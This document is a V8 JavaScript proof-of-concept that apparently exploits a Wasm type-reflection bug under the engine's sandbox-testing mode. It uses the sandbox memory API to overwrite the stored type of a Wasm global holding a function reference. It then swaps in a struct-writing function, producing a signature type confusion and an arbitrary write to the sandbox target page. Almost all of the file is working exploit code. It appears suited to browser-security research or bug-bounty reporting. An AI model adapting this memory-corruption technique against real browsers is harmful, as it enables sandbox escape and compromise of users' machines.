// Flags: --sandbox-testing --experimental-wasm-type-reflection
// https://chromium-review.googlesource.com/c/v8/v8/+/5577681
// 

d8.file.execute("/home/vult/Desktop/v8-wasm/v8/test/mjsunit/wasm/wasm-module-builder.js");


let builder = new WasmModuleBuilder();
let $struct = builder.addStruct([makeField(kWasmI64, true)]);
let $sig_v_ls = builder.addType(makeSig([kWasmI64, wasmRefType($struct)], []));
let $sig_v_ll = builder.addType(makeSig([kWasmI64, kWasmI64], []));
let $nop = builder.addFunction("nop", $sig_v_ll)
  .exportFunc()
  .addBody([
  ]);
let $fn = builder.addGlobal(wasmRefType($sig_v_ll), true, false, [kExprRefFunc, $nop.index]).exportAs("fn");
builder.addFunction("boom", $sig_v_ll)
  .exportFunc()
  .addBody([
    kExprLocalGet, 1,
    kExprLocalGet, 0,
    kExprGlobalGet, $fn.index,
    kExprCallRef, $sig_v_ll, // call_ref
  ]);

builder.addFunction("writer", $sig_v_ls)
  .exportFunc()
  .addBody([
    kExprLocalGet, 1,
    kExprLocalGet, 0,
    kGCPrefix, kExprStructSet, $struct, 0,
  ]);


let instance = builder.instantiate();
let { fn, writer, boom, nop } = instance.exports;

// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kWasmGlobalObjectRawTypeOffset = 0x1c;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

const kRef = 9;
const kSmiTagSize = 1;
const kHeapTypeShift = 5;
let new_type = (($sig_v_ls << kHeapTypeShift) | kRef) << kSmiTagSize;

// --allow-natives-syntax + %WasmTierUpFunction(boom) for instant trigger
// console.log("Triggering tier-up to TurboFan...");
// for (let i = 0; i < 0x100000; i++) {
//   boom(0n, 0n);
// }
// console.log("Done, triggering arbitrary write");

setField(getPtr(fn), kWasmGlobalObjectRawTypeOffset, new_type);
fn.value = writer;

boom(BigInt(Sandbox.targetPage) - 0x7n, 0x42n);